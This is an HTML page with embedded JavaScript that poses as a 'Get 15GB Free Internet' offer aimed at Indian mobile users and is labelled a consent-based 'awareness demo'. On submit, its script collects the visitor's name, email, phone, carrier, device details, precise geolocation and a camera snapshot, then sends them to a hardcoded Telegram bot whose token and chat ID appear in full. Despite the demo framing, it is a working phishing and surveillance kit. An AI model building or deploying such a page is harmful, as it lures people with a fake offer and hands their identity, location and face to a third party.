<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Free Internet Data Hub</title>
<style>
:root{--bg-start:#1bd49f;--bg-end:#2cc0ff;--muted:#5b6470;--card:#fff;--accent:#15b37a;--shadow:0 14px 30px rgba(12,20,35,0.08)}
*{box-sizing:border-box}html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;color:#0b1220}
body{background:linear-gradient(180deg,#f7fdf9 0%,#f3fbff 100%);padding:20px}
.appbar{display:flex;align-items:center;gap:12px;background:#fff;border-radius:10px;padding:14px 16px;box-shadow:var(--shadow);max-width:1100px;margin:0 auto 18px}
.logo{display:flex;align-items:center;gap:10px}
.logo .icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--bg-start),var(--bg-end));display:grid;place-items:center;color:#fff;font-weight:800}
.brand{font-size:20px;color:var(--bg-start);font-weight:700}
.hero{max-width:1100px;margin:0 auto;background:linear-gradient(180deg,var(--bg-start),var(--bg-end));color:#fff;border-radius:18px;padding:36px 24px;box-shadow:var(--shadow)}
.main{max-width:1100px;margin:18px auto 80px;display:grid;grid-template-columns:1fr 420px;gap:24px}
.left{padding:18px;border-radius:14px;background:linear-gradient(180deg,#f7fff7,#fff);box-shadow:var(--shadow)}
.card{background:var(--card);border-radius:16px;padding:18px;box-shadow:var(--shadow)}
.field{width:100%;padding:12px;border-radius:12px;border:1px solid #eef3f2;margin-top:8px;font-size:15px}
.label{font-size:13px;color:var(--muted);margin-top:12px;display:block}
.btnPrimary{display:inline-block;background:var(--accent);color:#fff;padding:12px;border-radius:12px;border:0;font-weight:800;cursor:pointer;margin-top:14px;width:100%}
.muted{color:var(--muted);font-size:13px}
.status{margin-top:12px;color:var(--muted);font-size:14px}
.outputBox{background:#f9fdf9;border-radius:12px;padding:12px;margin-top:14px;font-size:13px;white-space:pre-wrap}
.small{font-size:12px;color:#9aa3b2;margin-top:10px}
@media (max-width:980px){.main{grid-template-columns:1fr}.hero{padding:22px}}
</style>
</head>
<body>

<div class="appbar">
  <div class="logo">
    <div class="icon">Wi</div>
    <div>
      <div class="brand">Free Internet</div>
      <small class="muted">Awareness demo</small>
    </div>
  </div>
</div>

<section class="hero" aria-label="hero">
  <h1 style="margin:0 0 8px 0">Get 15GB Free Internet (Demo)</h1>
  <p style="margin:0;color:rgba(255,255,255,0.95)">Consent-first demo — will request location & camera only after you click submit and check consent.</p>
</section>

<main class="main" role="main">
  <div class="left">
    <h3 style="margin-top:0">How this works</h3>
    <p class="muted">When you fill the form and click submit (with consent checked), the page will:</p>
    <ul class="muted">
      <li>Request location (geolocation API)</li>
      <li>Request camera snapshot (getUserMedia)</li>
      <li>Send a text message to your Telegram bot with the collected data</li>
      <li>If snapshot captured, send it as a photo to the same Telegram chat</li>
    </ul>
    <p class="small">Reminder: This demo posts directly to the Telegram Bot API from the browser. For production, host a server-side forwarder so the BOT token is never exposed client-side.</p>
  </div>

  <aside class="card" aria-labelledby="formTitle">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div>
        <div style="font-size:12px;color:var(--muted)">Offer</div>
        <h3 id="formTitle" style="margin:4px 0 0 0">Claim Your Free 15GB Now</h3>
      </div>
      <div class="muted">Free demo</div>
    </div>

    <label class="label" for="fullName">Full Name</label>
    <input id="fullName" class="field" type="text" placeholder="Your full name" />

    <label class="label" for="email">Email</label>
    <input id="email" class="field" type="email" placeholder="you@example.com" />

    <label class="label" for="country">Country</label>
    <select id="country" class="field">
      <option value="">Select country</option>
      <option>India</option><option>United States</option><option>United Kingdom</option><option>Canada</option><option>Australia</option><option>Other</option>
    </select>

    <label class="label" for="carrier">SIM Provider</label>
    <select id="carrier" class="field">
      <option value="">Select operator</option>
      <option>Jio</option><option>Airtel</option><option>Vodafone</option><option>Idea</option><option>Other</option>
    </select>

    <label class="label" for="phone">Phone</label>
    <input id="phone" class="field" type="tel" placeholder="+91xxxxxxxxxx" />

    <label class="label" for="feedback">Feedback (optional)</label>
    <textarea id="feedback" class="field" rows="3" placeholder="Any message (optional)"></textarea>

    <div style="margin-top:10px;display:flex;gap:8px;align-items:flex-start">
      <input id="consent" type="checkbox" />
      <div>
        <label for="consent" style="font-weight:700">I consent</label>
        <div class="muted">I agree to share my location and snapshot for this demo. Data will be sent to the configured Telegram bot.</div>
      </div>
    </div>

    <button id="claimBtn" class="btnPrimary">Submit & Send to Telegram</button>
    <div id="status" class="status"></div>
    <div id="output" class="outputBox" style="display:none"></div>

    <p class="small">BOT token is stored in the page for demo only. Use a server forwarder in production.</p>
  </aside>
</main>

<script>
/* ---------- CONFIG: set your bot token & chat id here ----------
   NOTE: Putting BOT_TOKEN client-side is insecure. Use server-side
   forwarding in production. For demo only.
-----------------------------------------------------------------*/
const BOT_TOKEN = "8124899365:AAHA8Bn9Uvs2eXO_Zb0YC8VaTBKuduXZ3No";   // e.g. "123456:ABC-DEF..."
const CHAT_ID  = "6371972449";      // numeric id or @channelname

/* helper */
const get = id => document.getElementById(id);
const claimBtn = get('claimBtn');
const statusEl = get('status');
const outputEl = get('output');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const safe = v => (v||'').toString().trim();

function getDeviceInfo(){
  return {
    platform: navigator.platform || 'unknown',
    userAgent: navigator.userAgent || 'unknown',
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language || 'unknown',
    timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'unknown'
  };
}

function requestLocation(timeout = 8000){
  return new Promise(resolve => {
    if(!navigator.geolocation) return resolve(null);
    let done = false;
    const timer = setTimeout(()=>{ if(!done){ done = true; resolve(null); } }, timeout);
    navigator.geolocation.getCurrentPosition(pos=>{
      if(done) return;
      done = true; clearTimeout(timer);
      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
    }, err=>{
      if(done) return;
      done = true; clearTimeout(timer);
      resolve(null);
    }, { enableHighAccuracy:true, timeout });
  });
}

async function takeSnapshot(){
  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  let stream = null;
  try{
    stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720 } });
    const track = stream.getVideoTracks()[0];
    // try ImageCapture if available (better quality / orientation)
    if(window.ImageCapture){
      try{
        const ic = new ImageCapture(track);
        if(ic.takePhoto){
          const blob = await ic.takePhoto();
          try{ track.stop(); }catch(e){}
          return blob;
        }
      }catch(e){
        // fall through to canvas method
      }
    }
    const video = document.createElement('video');
    video.playsInline = true;
    video.muted = true;
    video.srcObject = stream;
    await video.play().catch(()=>{});
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
    try{ track.stop(); }catch(e){}
    try{ video.pause(); video.srcObject = null; }catch(e){}
    return blob;
  }catch(e){
    console.warn('snapshot failed', e);
    try{ if(stream){ stream.getTracks().forEach(t=>t.stop()); } }catch(e){}
    return null;
  }
}

async function sendTelegramText(text){
  if(!BOT_TOKEN || !CHAT_ID){ console.warn('Telegram tokens not set'); return null; }
  try{
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('text', text);
    // optional: use HTML parse mode
    fd.append('parse_mode','HTML');
    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', body: fd });
    return await resp.json();
  }catch(e){
    console.error('sendTelegramText error', e);
    return null;
  }
}

async function sendTelegramPhoto(captionText, blob){
  if(!BOT_TOKEN || !CHAT_ID){ console.warn('Telegram tokens not set'); return null; }
  try{
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, 'snapshot.jpg');
    // caption must be <1024 chars; trim if needed
    fd.append('caption', captionText.length > 900 ? captionText.slice(0,900) + '...' : captionText);
    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
    return await resp.json();
  }catch(e){
    console.error('sendTelegramPhoto error', e);
    return null;
  }
}

function buildMessage(data, dev, loc){
  // build an HTML-formatted message for Telegram
  const lines = [];
  lines.push(`<b>Demo: FreeRecharge Submission</b>`);
  lines.push(`<b>Time:</b> ${new Date().toISOString()}`);
  lines.push(`<b>Name:</b> ${escapeHtml(data.name)}`);
  lines.push(`<b>Email:</b> ${escapeHtml(data.email)}`);
  lines.push(`<b>Phone:</b> ${escapeHtml(data.phone)}`);
  lines.push(`<b>Operator:</b> ${escapeHtml(data.carrier)}`);
  lines.push(`<b>Country:</b> ${escapeHtml(data.country)}`);
  lines.push(`<b>Network:</b> ${escapeHtml(data.network)}`);
  lines.push(`<b>Feedback:</b> ${escapeHtml(data.feedback || 'Not provided')}`);
  lines.push('---');
  lines.push(`<b>Device:</b> ${escapeHtml(dev.platform)} | ${escapeHtml(dev.screen)} | ${escapeHtml(dev.language)}`);
  lines.push(`<b>Timezone:</b> ${escapeHtml(dev.timezone)}`);
  lines.push(`<b>TouchPoints:</b> ${navigator.maxTouchPoints || 0}`);
  if(loc){
    lines.push(`<b>Location:</b> https://maps.google.com/?q=${loc.lat},${loc.lon} (accuracy: ${loc.accuracy || 'n/a'})`);
  } else {
    lines.push(`<b>Location:</b> Not shared`);
  }
  return lines.join('\n');
}

function escapeHtml(text){
  return (text||'').toString()
    .replaceAll('&','&amp;')
    .replaceAll('<','&lt;')
    .replaceAll('>','&gt;')
    .replaceAll('"','&quot;');
}

/* main submit handler */
claimBtn.addEventListener('click', async () => {
  statusEl.textContent = '';
  outputEl.style.display = 'none';
  const data = {
    name: safe(get('fullName').value),
    email: safe(get('email').value),
    country: safe(get('country').value),
    carrier: safe(get('carrier').value),
    phone: safe(get('phone').value),
    feedback: safe(get('feedback').value),
    network: safe(get('network') ? get('network').value : '')
  };
  const consent = get('consent').checked;

  // basic validation
  if(!data.name || !data.email || !data.country || !data.carrier || !data.phone || !consent){
    statusEl.textContent = '⚠ Please complete required fields and give consent.';
    return;
  }

  statusEl.textContent = 'Requesting permissions (location & camera)...';
  await sleep(300);

  // request location (with timeout) and snapshot
  const [loc, snapshot] = await Promise.all([
    requestLocation(8000).catch(()=>null),
    takeSnapshot().catch(()=>null)
  ]);

  const dev = getDeviceInfo();
  const message = buildMessage(data, dev, loc);

  statusEl.textContent = 'Sending text to Telegram...';
  const textResp = await sendTelegramText(message);
  if(textResp && textResp.ok){
    statusEl.textContent = 'Text sent. ' + (snapshot ? 'Sending photo...' : 'No photo captured.');
  } else {
    statusEl.textContent = 'Failed to send text (check BOT_TOKEN/CHAT_ID).';
  }

  if(snapshot){
    // snapshot is Blob, send as photo
    const photoResp = await sendTelegramPhoto('Snapshot for ' + (data.name || 'user'), snapshot);
    if(photoResp && photoResp.ok){
      statusEl.textContent = 'Photo sent. Demo complete.';
    } else {
      statusEl.textContent = 'Photo failed to send (see console).';
    }
  }

  // show local summary
  const localSummary = [
    `Name: ${data.name}`,
    `Email: ${data.email}`,
    `Phone: ${data.phone}`,
    `Operator: ${data.carrier}`,
    `Country: ${data.country}`,
    `Network: ${data.network}`,
    `Feedback: ${data.feedback || 'Not provided'}`,
    `Location: ${loc ? loc.lat + ', ' + loc.lon : 'Not shared'}`,
    `Snapshot: ${snapshot ? 'Captured' : 'Not captured'}`
  ].join('\n\n');

  outputEl.style.display = 'block';
  outputEl.textContent = localSummary;
});

/* small helper for missing elements */
function getOrNull(id){ try{ return get(id); }catch(e){ return null; } }

/* DOM helpers used earlier but not present in all versions */
function getElementSafe(id){ return document.getElementById(id); }

/* End of script */
</script>

</body>
</html>
